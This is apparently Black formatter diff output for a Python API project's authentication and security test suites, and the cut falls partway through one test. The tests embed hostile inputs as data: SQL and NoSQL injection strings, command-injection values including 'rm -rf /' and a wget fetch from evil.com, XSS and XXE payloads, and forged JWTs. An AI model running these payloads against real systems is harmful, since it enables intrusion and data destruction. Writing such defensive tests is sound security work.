+        response = test_client.post(API_ENDPOINTS["auth_login"], data=incomplete_data)
+
         assert response.status_code == 422  # Validation error
-    
+
     def test_refresh_token_success(self, test_client: TestClient):
         """Test successful token refresh."""
         user_data = {
             "sub": TEST_USERS["user"]["user_id"],
             "email": TEST_USERS["user"]["email"],
-            "role": TEST_USERS["user"]["role"]
-        }
-        
+            "role": TEST_USERS["user"]["role"],
+        }
+
         refresh_token = create_refresh_token(user_data)
-        
+
         response = test_client.post(
-            API_ENDPOINTS["auth_refresh"],
-            json={"refresh_token": refresh_token}
-        )
-        
+            API_ENDPOINTS["auth_refresh"], json={"refresh_token": refresh_token}
+        )
+
         assert response.status_code == 200
         data = response.json()
-        
+
         assert "access_token" in data
         assert "token_type" in data
         assert data["token_type"] == "bearer"
-    
+
     def test_refresh_token_invalid(self, test_client: TestClient):
         """Test token refresh with invalid token."""
         response = test_client.post(
-            API_ENDPOINTS["auth_refresh"],
-            json={"refresh_token": "invalid_token"}
-        )
-        
-        assert response.status_code == 401
-    
+            API_ENDPOINTS["auth_refresh"], json={"refresh_token": "invalid_token"}
+        )
+
+        assert response.status_code == 401
+
     def test_refresh_token_expired(self, test_client: TestClient):
         """Test token refresh with expired token."""
-        user_data = {
-            "sub": "test_user",
-            "email": "test@example.com"
-        }
-        
+        user_data = {"sub": "test_user", "email": "test@example.com"}
+
         # Create expired refresh token
         expired_token = create_refresh_token(
-            user_data,
-            expires_delta=timedelta(seconds=-1)
-        )
-        
+            user_data, expires_delta=timedelta(seconds=-1)
+        )
+
         response = test_client.post(
-            API_ENDPOINTS["auth_refresh"],
-            json={"refresh_token": expired_token}
-        )
-        
-        assert response.status_code == 401
+            API_ENDPOINTS["auth_refresh"], json={"refresh_token": expired_token}
+        )
+
+        assert response.status_code == 401
+
 
 class TestAPIKeyAuthentication:
     """Test API key authentication."""
-    
+
     def test_valid_api_key(self, test_client: TestClient):
         """Test authentication with valid API key."""
         api_key = "test_api_key_1"  # From test configuration
-        
+
         response = test_client.get(
-            API_ENDPOINTS["health"],
-            headers={"X-API-Key": api_key}
-        )
-        
-        assert response.status_code == 200
-    
+            API_ENDPOINTS["health"], headers={"X-API-Key": api_key}
+        )
+
+        assert response.status_code == 200
+
     def test_invalid_api_key(self, test_client: TestClient):
         """Test authentication with invalid API key."""
         invalid_key = "invalid_api_key"
-        
+
         response = test_client.get(
-            "/process-point",  # Protected endpoint
-            headers={"X-API-Key": invalid_key}
-        )
-        
-        assert response.status_code == 401
-    
+            "/process-point", headers={"X-API-Key": invalid_key}  # Protected endpoint
+        )
+
+        assert response.status_code == 401
+
     def test_missing_api_key(self, test_client: TestClient):
         """Test access to protected endpoint without API key."""
         response = test_client.get("/process-point")
-        
-        assert response.status_code == 401
-    
-    def test_api_key_and_jwt_precedence(self, test_client: TestClient, user_headers: Dict):
+
+        assert response.status_code == 401
+
+    def test_api_key_and_jwt_precedence(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test precedence when both API key and JWT are provided."""
-        headers = {
-            **user_headers,
-            "X-API-Key": "test_api_key_1"
-        }
-        
-        response = test_client.get(
-            API_ENDPOINTS["health"],
-            headers=headers
-        )
-        
-        assert response.status_code == 200
+        headers = {**user_headers, "X-API-Key": "test_api_key_1"}
+
+        response = test_client.get(API_ENDPOINTS["health"], headers=headers)
+
+        assert response.status_code == 200
+
 
 class TestRoleBasedAccessControl:
     """Test role-based access control."""
-    
-    def test_admin_access_all_endpoints(self, test_client: TestClient, admin_headers: Dict):
+
+    def test_admin_access_all_endpoints(
+        self, test_client: TestClient, admin_headers: Dict
+    ):
         """Test admin access to all endpoints."""
         admin_endpoints = [
             "/health",
             "/statistics",
             "/metrics",
             "/admin/users",
-            "/admin/config"
+            "/admin/config",
         ]
-        
+
         for endpoint in admin_endpoints:
             response = test_client.get(endpoint, headers=admin_headers)
             assert response.status_code in [200, 404]  # 404 if endpoint doesn't exist
-    
-    def test_user_access_restricted_endpoints(self, test_client: TestClient, user_headers: Dict):
+
+    def test_user_access_restricted_endpoints(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test regular user access to restricted endpoints."""
-        restricted_endpoints = [
-            "/admin/users",
-            "/admin/config",
-            "/admin/logs"
-        ]
-        
+        restricted_endpoints = ["/admin/users", "/admin/config", "/admin/logs"]
+
         for endpoint in restricted_endpoints:
             response = test_client.get(endpoint, headers=user_headers)
             assert response.status_code == 403  # Forbidden
-    
-    def test_readonly_user_write_operations(self, test_client: TestClient, readonly_headers: Dict):
+
+    def test_readonly_user_write_operations(
+        self, test_client: TestClient, readonly_headers: Dict
+    ):
         """Test readonly user attempting write operations."""
         write_endpoints = [
             ("POST", "/process-point"),
             ("POST", "/process-batch"),
-            ("DELETE", "/session/123")
+            ("DELETE", "/session/123"),
         ]
-        
+
         for method, endpoint in write_endpoints:
             if method == "POST":
                 response = test_client.post(
-                    endpoint,
-                    json={"test": "data"},
-                    headers=readonly_headers
+                    endpoint, json={"test": "data"}, headers=readonly_headers
                 )
             elif method == "DELETE":
                 response = test_client.delete(endpoint, headers=readonly_headers)
-            
+
             assert response.status_code == 403  # Forbidden
-    
+
     def test_scope_based_access_control(self, test_client: TestClient):
         """Test scope-based access control."""
         # Create token with limited scopes
         limited_user_data = {
             "sub": "limited_user",
             "email": "limited@example.com",
             "role": "user",
-            "scopes": ["read"]  # Only read scope
-        }
-        
+            "scopes": ["read"],  # Only read scope
+        }
+
         token = create_access_token(limited_user_data)
         headers = {"Authorization": f"***"}
-        
+
         # Should be able to read
         response = test_client.get("/health", headers=headers)
         assert response.status_code == 200
-        
+
         # Should not be able to write
         response = test_client.post(
-            "/process-point",
-            json={"test": "data"},
-            headers=headers
+            "/process-point", json={"test": "data"}, headers=headers
         )
         assert response.status_code == 403
+
 
 class TestTokenValidation:
     """Test JWT token validation middleware."""
-    
+
     def test_valid_token_access(self, test_client: TestClient, user_headers: Dict):
         """Test access with valid JWT token."""
-        response = test_client.get(
-            "/process-point",
-            headers=user_headers
-        )
-        
+        response = test_client.get("/process-point", headers=user_headers)
+
         # Should not be unauthorized (might be 422 for missing data)
         assert response.status_code != 401
-    
+
     def test_invalid_token_access(self, test_client: TestClient):
         """Test access with invalid JWT token."""
         invalid_headers = {"Authorization": "***"}
-        
-        response = test_client.get(
-            "/process-point",
-            headers=invalid_headers
-        )
-        
-        assert response.status_code == 401
-    
+
+        response = test_client.get("/process-point", headers=invalid_headers)
+
+        assert response.status_code == 401
+
     def test_expired_token_access(self, test_client: TestClient):
         """Test access with expired JWT token."""
         user_data = {
             "sub": "test_user",
             "email": "test@example.com",
             "role": "user",
-            "scopes": ["read", "write"]
-        }
-        
+            "scopes": ["read", "write"],
+        }
+
         # Create expired token
         expired_token = create_access_token(
-            user_data,
-            expires_delta=timedelta(seconds=-1)
+            user_data, expires_delta=timedelta(seconds=-1)
         )
         expired_headers = {"Authorization": f"***"}
-        
-        response = test_client.get(
-            "/process-point",
-            headers=expired_headers
-        )
-        
-        assert response.status_code == 401
-    
+
+        response = test_client.get("/process-point", headers=expired_headers)
+
+        assert response.status_code == 401
+
     def test_malformed_authorization_header(self, test_client: TestClient):
         """Test access with malformed authorization header."""
         malformed_headers = [
             {"Authorization": "InvalidFormat token"},
             {"Authorization": "Bearer"},  # Missing token
             {"Authorization": "token_without_bearer"},
-            {"Authorization": ""}
+            {"Authorization": ""},
         ]
-        
+
         for headers in malformed_headers:
             response = test_client.get("/process-point", headers=headers)
             assert response.status_code == 401
 
+
 class TestSecurityHeaders:
     """Test security headers and CORS."""
-    
+
     def test_security_headers_present(self, test_client: TestClient):
         """Test presence of security headers."""
         response = test_client.get(API_ENDPOINTS["health"])
-        
-        assert response.status_code == 200
-        
+
+        assert response.status_code == 200
+
         # Check for security headers
         expected_headers = [
             "X-Content-Type-Options",
-            "X-Frame-Options", 
+            "X-Frame-Options",
             "X-XSS-Protection",
-            "Strict-Transport-Security"
+            "Strict-Transport-Security",
         ]
-        
+
         for header in expected_headers:
             assert header in response.headers
-    
+
     def test_cors_headers(self, test_client: TestClient):
         """Test CORS headers for cross-origin requests."""
         # Preflight request
         response = test_client.options(
             API_ENDPOINTS["health"],
             headers={
                 "Origin": "https://example.com",
                 "Access-Control-Request-Method": "GET",
-                "Access-Control-Request-Headers": "Authorization"
-            }
-        )
-        
+                "Access-Control-Request-Headers": "Authorization",
+            },
+        )
+
         assert response.status_code == 200
         assert "Access-Control-Allow-Origin" in response.headers
         assert "Access-Control-Allow-Methods" in response.headers
         assert "Access-Control-Allow-Headers" in response.headers
-    
+
     def test_content_security_policy(self, test_client: TestClient):
         """Test Content Security Policy header."""
         response = test_client.get(API_ENDPOINTS["health"])
-        
+
         if "Content-Security-Policy" in response.headers:
             csp = response.headers["Content-Security-Policy"]
             assert "default-src" in csp
 
+
 class TestRateLimiting:
     """Test rate limiting and abuse prevention."""
-    
+
     def test_rate_limit_per_user(self, test_client: TestClient, user_headers: Dict):
         """Test rate limiting per authenticated user."""
         responses = []
-        
+
         # Make many requests rapidly
         for i in range(100):
-            response = test_client.get(
-                API_ENDPOINTS["health"],
-                headers=user_headers
-            )
+            response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
             responses.append(response.status_code)
-            
+
             # Stop if we hit rate limit
             if response.status_code == 429:
                 break
-        
+
         # Should eventually get rate limited
         assert 429 in responses
-    
+
     def test_rate_limit_headers(self, test_client: TestClient, user_headers: Dict):
         """Test rate limit headers in response."""
-        response = test_client.get(
-            API_ENDPOINTS["health"],
-            headers=user_headers
-        )
-        
+        response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
+
         # Check for rate limit headers
         rate_limit_headers = [
             "X-RateLimit-Limit",
             "X-RateLimit-Remaining",
-            "X-RateLimit-Reset"
+            "X-RateLimit-Reset",
         ]
-        
+
         for header in rate_limit_headers:
             # Headers might not be present if rate limiting is not configured
             if header in response.headers:
                 assert isinstance(response.headers[header], str)
-    
-    def test_rate_limit_different_endpoints(self, test_client: TestClient, user_headers: Dict):
+
+    def test_rate_limit_different_endpoints(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test rate limiting across different endpoints."""
-        endpoints = [
-            API_ENDPOINTS["health"],
-            "/statistics",
-            "/clusters"
-        ]
-        
+        endpoints = [API_ENDPOINTS["health"], "/statistics", "/clusters"]
+
         # Test that rate limits might be different for different endpoints
         for endpoint in endpoints:
             response = test_client.get(endpoint, headers=user_headers)
             # Should be able to access different endpoints
             assert response.status_code in [200, 404, 422]
 
+
 class TestAuthenticationAuditLog:
     """Test authentication event logging."""
-    
+
     def test_successful_login_logged(self, test_client: TestClient, captured_logs):
         """Test that successful logins are logged."""
         login_data = {
             "username": TEST_USERS["user"]["email"],
-            "password": TEST_USERS["user"]["password"]
-        }
-        
-        with patch('auth.authenticate_user') as mock_auth:
+            "password": TEST_USERS["user"]["password"],
+        }
+
+        with patch("auth.authenticate_user") as mock_auth:
             mock_auth.return_value = {
                 "user_id": TEST_USERS["user"]["user_id"],
                 "email": TEST_USERS["user"]["email"],
-                "role": TEST_USERS["user"]["role"]
+                "role": TEST_USERS["user"]["role"],
             }
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-        
-        assert response.status_code == 200
-        
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
+        assert response.status_code == 200
+
         # Check that login was logged
         log_content = captured_logs.getvalue()
         assert "login" in log_content.lower() or "authentication" in log_content.lower()
-    
+
     def test_failed_login_logged(self, test_client: TestClient, captured_logs):
         """Test that failed logins are logged."""
-        login_data = {
-            "username": "invalid@example.com",
-            "password": "wrong_password"
-        }
-        
-        with patch('auth.authenticate_user') as mock_auth:
+        login_data = {"username": "invalid@example.com", "password": "wrong_password"}
+
+        with patch("auth.authenticate_user") as mock_auth:
             mock_auth.return_value = None
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-        
-        assert response.status_code == 401
-        
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
+        assert response.status_code == 401
+
         # Check that failed login was logged
         log_content = captured_logs.getvalue()
         assert "failed" in log_content.lower() or "unauthorized" in log_content.lower()
-    
+
     def test_token_refresh_logged(self, test_client: TestClient, captured_logs):
         """Test that token refresh events are logged."""
         user_data = {
             "sub": TEST_USERS["user"]["user_id"],
-            "email": TEST_USERS["user"]["email"]
-        }
-        
+            "email": TEST_USERS["user"]["email"],
+        }
+
         refresh_token = create_refresh_token(user_data)
-        
+
         response = test_client.post(
-            API_ENDPOINTS["auth_refresh"],
-            json={"refresh_token": refresh_token}
-        )
-        
-        assert response.status_code == 200
-        
+            API_ENDPOINTS["auth_refresh"], json={"refresh_token": refresh_token}
+        )
+
+        assert response.status_code == 200
+
         # Check that refresh was logged
         log_content = captured_logs.getvalue()
         assert "refresh" in log_content.lower() or "token" in log_content.lower()
 
+
 @pytest.mark.security
 class TestSecurityVulnerabilities:
     """Test protection against common security vulnerabilities."""
-    
-    def test_sql_injection_protection(self, test_client: TestClient, user_headers: Dict):
+
+    def test_sql_injection_protection(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against SQL injection."""
         malicious_input = {
             "point_id": "'; DROP TABLE data_points; --",
             "features": [1.0, 2.0, 3.0],
-            "session_id": str(uuid.uuid4())
-        }
-        
+            "session_id": str(uuid.uuid4()),
+        }
+
         response = test_client.post(
-            "/process-point",
-            json=malicious_input,
-            headers=user_headers
-        )
-        
+            "/process-point", json=malicious_input, headers=user_headers
+        )
+
         # Should handle gracefully without SQL injection
         assert response.status_code in [200, 400, 422]
-    
+
     def test_xss_protection(self, test_client: TestClient, user_headers: Dict):
         """Test protection against XSS attacks."""
         malicious_input = {
             "point_id": "<script>alert('xss')</script>",
             "features": [1.0, 2.0, 3.0],
-            "session_id": str(uuid.uuid4())
-        }
-        
+            "session_id": str(uuid.uuid4()),
+        }
+
         response = test_client.post(
-            "/process-point",
-            json=malicious_input,
-            headers=user_headers
-        )
-        
+            "/process-point", json=malicious_input, headers=user_headers
+        )
+
         # Check response doesn't contain unescaped script
         if response.status_code == 200:
             response_text = response.text
             assert "<script>" not in response_text
-    
+
     def test_jwt_algorithm_confusion(self, test_client: TestClient):
         """Test protection against JWT algorithm confusion attacks."""
         # Try to create token with 'none' algorithm
-        payload = {
-            "sub": "test_user",
-            "exp": datetime.utcnow() + timedelta(hours=1)
-        }
-        
+        payload = {"sub": "test_user", "exp": datetime.utcnow() + timedelta(hours=1)}
+
         malicious_token = jwt.encode(payload, "", algorithm="none")
         headers = {"Authorization": f"***"}
-        
+
         response = test_client.get("/process-point", headers=headers)
-        
+
         # Should reject tokens with 'none' algorithm
         assert response.status_code == 401
-    
+
     def test_timing_attack_protection(self, test_client: TestClient):
         """Test protection against timing attacks on login."""
         import time
-        
+
         # Test with valid vs invalid usernames
         valid_user = TEST_USERS["user"]["email"]
         invalid_user = "nonexistent@example.com"
         password = "wrong_password"
-        
+
         # Measure timing for valid user
         start_time = time.time()
         response1 = test_client.post(
             API_ENDPOINTS["auth_login"],
-            data={"username": valid_user, "password": password}
+            data={"username": valid_user, "password": password},
         )
         time1 = time.time() - start_time
-        
+
         # Measure timing for invalid user
         start_time = time.time()
         response2 = test_client.post(
             API_ENDPOINTS["auth_login"],
-            data={"username": invalid_user, "password": password}
+            data={"username": invalid_user, "password": password},
         )
         time2 = time.time() - start_time
-        
+
         # Both should fail
         assert response1.status_code == 401
         assert response2.status_code == 401
-        
+
         # Timing difference should be minimal (less than 100ms)
         timing_difference = abs(time1 - time2)
-        assert timing_difference < 0.1
\ No newline at end of file
+        assert timing_difference < 0.1
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_auth.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_security.py	2025-06-10 20:31:25.485857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_security.py	2025-06-10 20:32:37.851559+00:00
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_security.py
@@ -29,924 +29,930 @@
 from urllib.parse import quote, unquote
 
 from auth import create_access_token, verify_token
 from . import TEST_USERS, API_ENDPOINTS
 
+
 class TestInputValidationSecurity:
     """Test input validation and sanitization security."""
-    
-    def test_sql_injection_prevention(self, test_client: TestClient, user_headers: Dict):
+
+    def test_sql_injection_prevention(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against SQL injection attacks."""
         sql_injection_payloads = [
             "'; DROP TABLE users; --",
             "' OR '1'='1",
             "'; DELETE FROM data_points; --",
             "' UNION SELECT * FROM system_users --",
             "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
-            "' OR 1=1; UPDATE users SET role='admin' WHERE id=1; --"
-        ]
-        
+            "' OR 1=1; UPDATE users SET role='admin' WHERE id=1; --",
+        ]
+
         for payload in sql_injection_payloads:
             # Test in point_id field
             malicious_data = {
                 "point_id": payload,
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             }
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json=malicious_data,
-                headers=user_headers
-            )
-            
+                headers=user_headers,
+            )
+
             # Should handle safely without SQL injection
             assert response.status_code in [200, 400, 422]
-            
+
             # Check response doesn't contain SQL error messages
             response_text = response.text.lower()
             sql_errors = ["syntax error", "sql", "database", "table", "column"]
             for error in sql_errors:
                 assert error not in response_text or "error" not in response_text
-    
-    def test_nosql_injection_prevention(self, test_client: TestClient, user_headers: Dict):
+
+    def test_nosql_injection_prevention(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against NoSQL injection attacks."""
         nosql_payloads = [
             {"$ne": None},
             {"$gt": ""},
             {"$where": "this.password.length > 0"},
             {"$regex": ".*"},
             {"$or": [{"admin": True}]},
-            {"$in": ["admin", "root"]}
-        ]
-        
+            {"$in": ["admin", "root"]},
+        ]
+
         for payload in nosql_payloads:
             malicious_data = {
                 "point_id": json.dumps(payload),
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             }
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json=malicious_data,
-                headers=user_headers
-            )
-            
+                headers=user_headers,
+            )
+
             # Should reject or sanitize NoSQL injection attempts
             assert response.status_code in [200, 400, 422]
-    
-    def test_command_injection_prevention(self, test_client: TestClient, user_headers: Dict):
+
+    def test_command_injection_prevention(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against command injection attacks."""
         command_injection_payloads = [
             "; ls -la",
             "| cat /etc/passwd",
             "&& rm -rf /",
             "; wget http://evil.com/malware.sh",
             "`whoami`",
             "$(id)",
             "; python -c 'import os; os.system(\"rm -rf /\")'",
-            "'; system('cat /etc/passwd'); --"
-        ]
-        
+            "'; system('cat /etc/passwd'); --",
+        ]
+
         for payload in command_injection_payloads:
             malicious_data = {
                 "point_id": f"test{payload}",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             }
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json=malicious_data,
-                headers=user_headers
-            )
-            
+                headers=user_headers,
+            )
+
             # Should handle safely without command execution
             assert response.status_code in [200, 400, 422]
-    
+
     def test_xss_prevention(self, test_client: TestClient, user_headers: Dict):
         """Test protection against Cross-Site Scripting (XSS) attacks."""
         xss_payloads = [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
             "<svg onload=alert('XSS')>",
             "<iframe src='javascript:alert(\"XSS\")'></iframe>",
             "'\"><script>alert('XSS')</script>",
             "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>"
-        ]
-        
+            "<input onfocus=alert('XSS') autofocus>",
+        ]
+
         for payload in xss_payloads:
             malicious_data = {
                 "point_id": payload,
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             }
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json=malicious_data,
-                headers=user_headers
-            )
-            
+                headers=user_headers,
+            )
+
             # Check response doesn't contain unescaped XSS payload
             if response.status_code == 200:
                 response_text = response.text
                 # XSS payload should be escaped or rejected
                 assert "<script>" not in response_text
                 assert "javascript:" not in response_text
                 assert "onload=" not in response_text
-    
+
     def test_ldap_injection_prevention(self, test_client: TestClient):
         """Test protection against LDAP injection attacks."""
         ldap_payloads = [
             "*)(uid=*))(|(uid=*",
             "*)(|(***",
             "admin)(&(***",
-            "*))(|(cn=*"
-        ]
-        
+            "*))(|(cn=*",
+        ]
+
         for payload in ldap_payloads:
-            login_data = {
-                "username": payload,
-                "password": "test_password"
-            }
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-            
+            login_data = {"username": payload, "password": "test_password"}
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
             # Should reject LDAP injection attempts
             assert response.status_code == 401
-    
-    def test_xml_injection_prevention(self, test_client: TestClient, user_headers: Dict):
+
+    def test_xml_injection_prevention(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against XML injection attacks."""
         xml_payloads = [
             "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
             "<?xml version='1.0'?><!DOCTYPE replace [<!ENTITY example 'Doe'>]><userInfo><firstName>John&example;</firstName></userInfo>",
-            "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>"
-        ]
-        
+            "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
+        ]
+
         for payload in xml_payloads:
             # Try to send XML payload as point_id
             malicious_data = {
                 "point_id": payload,
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             }
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json=malicious_data,
-                headers=user_headers
-            )
-            
+                headers=user_headers,
+            )
+
             # Should handle XML content safely
             assert response.status_code in [200, 400, 422]
 
+
 class TestAuthenticationSecurity:
     """Test authentication security vulnerabilities."""
-    
+
     def test_jwt_algorithm_confusion_attack(self, test_client: TestClient):
         """Test protection against JWT algorithm confusion attacks."""
         # Try to create token with 'none' algorithm
         payload = {
             "sub": "admin",
             "role": "admin",
             "scopes": ["read", "write", "admin"],
-            "exp": int(time.time()) + 3600
+            "exp": int(time.time()) + 3600,
         }
-        
+
         # Create token with no signature (none algorithm)
-        header = base64.urlsafe_b64encode(
-            json.dumps({"alg": "none", "typ": "JWT"}).encode()
-        ).decode().rstrip('=')
-        
-        payload_b64 = base64.urlsafe_b64encode(
-            json.dumps(payload).encode()
-        ).decode().rstrip('=')
-        
+        header = (
+            base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+            .decode()
+            .rstrip("=")
+        )
+
+        payload_b64 = (
+            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+        )
+
         malicious_token = f"{header}.{payload_b64}."
-        
+
         headers = {"Authorization": f"***"}
-        
+
         response = test_client.get("/admin/users", headers=headers)
-        
+
         # Should reject tokens with 'none' algorithm
         assert response.status_code == 401
-    
+
     def test_jwt_signature_bypass_attempt(self, test_client: TestClient):
         """Test JWT signature bypass attempts."""
         # Create valid token first
-        user_data = {
-            "sub": "regular_user",
-            "role": "user",
-            "scopes": ["read"]
-        }
+        user_data = {"sub": "regular_user", "role": "user", "scopes": ["read"]}
         valid_token = create_access_token(user_data)
-        
+
         # Try to modify payload to escalate privileges
-        parts = valid_token.split('.')
-        
+        parts = valid_token.split(".")
+
         # Decode and modify payload
-        payload_data = json.loads(
-            base64.urlsafe_b64decode(parts[1] + '==').decode()
-        )
+        payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
         payload_data["role"] = "admin"
         payload_data["scopes"] = ["read", "write", "admin"]
-        
+
         # Re-encode modified payload
-        modified_payload = base64.urlsafe_b64encode(
-            json.dumps(payload_data).encode()
-        ).decode().rstrip('=')
-        
+        modified_payload = (
+            base64.urlsafe_b64encode(json.dumps(payload_data).encode())
+            .decode()
+            .rstrip("=")
+        )
+
         # Create token with modified payload but original signature
         malicious_token = f"{parts[0]}.{modified_payload}.{parts[2]}"
-        
+
         headers = {"Authorization": f"***"}
-        
+
         response = test_client.get("/admin/users", headers=headers)
-        
+
         # Should reject token with invalid signature
         assert response.status_code == 401
-    
+
     def test_token_replay_attack_protection(self, test_client: TestClient):
         """Test protection against token replay attacks."""
         # Create token with short expiration
-        user_data = {
-            "sub": "test_user",
-            "role": "user",
-            "scopes": ["read", "write"]
-        }
-        
+        user_data = {"sub": "test_user", "role": "user", "scopes": ["read", "write"]}
+
         from datetime import datetime, timedelta
+
         short_token = create_access_token(user_data, expires_delta=timedelta(seconds=1))
-        
+
         # Use token immediately
         headers = {"Authorization": f"***"}
         response1 = test_client.get(API_ENDPOINTS["health"], headers=headers)
         assert response1.status_code == 200
-        
+
         # Wait for token to expire
         time.sleep(2)
-        
+
         # Try to replay expired token
         response2 = test_client.get(API_ENDPOINTS["health"], headers=headers)
         assert response2.status_code == 401
-    
+
     def test_brute_force_protection(self, test_client: TestClient):
         """Test protection against brute force attacks."""
         failed_attempts = 0
         max_attempts = 20
-        
+
         for i in range(max_attempts):
             login_data = {
                 "username": "admin@test.com",
-                "password": f"wrong_password_{i}"
+                "password": f"wrong_password_{i}",
             }
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-            
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
             if response.status_code == 429:  # Rate limited
                 break
             elif response.status_code == 401:  # Unauthorized
                 failed_attempts += 1
-            
+
             # Small delay between attempts
             time.sleep(0.1)
-        
+
         # Should eventually rate limit or block brute force attempts
         assert failed_attempts < max_attempts or response.status_code == 429
-    
+
     def test_session_fixation_protection(self, test_client: TestClient):
         """Test protection against session fixation attacks."""
         # This test assumes session management is implemented
         # For JWT-based auth, this is less relevant, but test token rotation
-        
+
         login_data = {
             "username": TEST_USERS["user"]["email"],
-            "password": TEST_USERS["user"]["password"]
+            "password": TEST_USERS["user"]["password"],
         }
-        
-        with patch('auth.authenticate_user') as mock_auth:
+
+        with patch("auth.authenticate_user") as mock_auth:
             mock_auth.return_value = {
                 "user_id": TEST_USERS["user"]["user_id"],
                 "email": TEST_USERS["user"]["email"],
                 "role": TEST_USERS["user"]["role"],
-                "scopes": TEST_USERS["user"]["scopes"]
+                "scopes": TEST_USERS["user"]["scopes"],
             }
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-        
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
         if response.status_code == 200:
             data = response.json()
             token1 = data.get("access_token")
-            
+
             # Login again - should get new token
-            with patch('auth.authenticate_user') as mock_auth:
+            with patch("auth.authenticate_user") as mock_auth:
                 mock_auth.return_value = {
                     "user_id": TEST_USERS["user"]["user_id"],
                     "email": TEST_USERS["user"]["email"],
                     "role": TEST_USERS["user"]["role"],
-                    "scopes": TEST_USERS["user"]["scopes"]
+                    "scopes": TEST_USERS["user"]["scopes"],
                 }
-                
+
                 response2 = test_client.post(
-                    API_ENDPOINTS["auth_login"],
-                    data=login_data
+                    API_ENDPOINTS["auth_login"], data=login_data
                 )
-            
+
             if response2.status_code == 200:
                 data2 = response2.json()
                 token2 = data2.get("access_token")
-                
+
                 # Tokens should be different (prevents session fixation)
                 assert token1 != token2
 
+
 class TestAuthorizationSecurity:
     """Test authorization and privilege escalation security."""
-    
-    def test_privilege_escalation_prevention(self, test_client: TestClient, user_headers: Dict):
+
+    def test_privilege_escalation_prevention(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test prevention of privilege escalation attacks."""
         # Regular user trying to access admin endpoints
         admin_endpoints = [
             "/admin/users",
             "/admin/config",
             "/admin/logs",
-            "/admin/system"
-        ]
-        
+            "/admin/system",
+        ]
+
         for endpoint in admin_endpoints:
             response = test_client.get(endpoint, headers=user_headers)
             assert response.status_code == 403  # Forbidden
-    
-    def test_horizontal_privilege_escalation(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_horizontal_privilege_escalation(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test prevention of horizontal privilege escalation."""
         # User trying to access another user's session
         session_id = seed_test_data["session"].id
-        
+
         # Try to access session belonging to different user
-        response = test_client.get(
-            f"/session/{session_id}",
-            headers=user_headers
-        )
-        
+        response = test_client.get(f"/session/{session_id}", headers=user_headers)
+
         # Should either be forbidden or return only authorized data
         if response.status_code == 200:
             data = response.json()
             # Should not contain sensitive data from other users
             assert "password" not in str(data).lower()
             assert "secret" not in str(data).lower()
-    
-    def test_insecure_direct_object_reference(self, test_client: TestClient, user_headers: Dict):
+
+    def test_insecure_direct_object_reference(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against insecure direct object references."""
         # Try to access objects by guessing IDs
         object_ids = [
-            "1", "2", "3",  # Simple numeric IDs
-            "admin", "root", "system",  # Common names
-            "../admin", "../../etc/passwd",  # Path traversal
-            str(uuid.uuid4())  # Random UUID
-        ]
-        
+            "1",
+            "2",
+            "3",  # Simple numeric IDs
+            "admin",
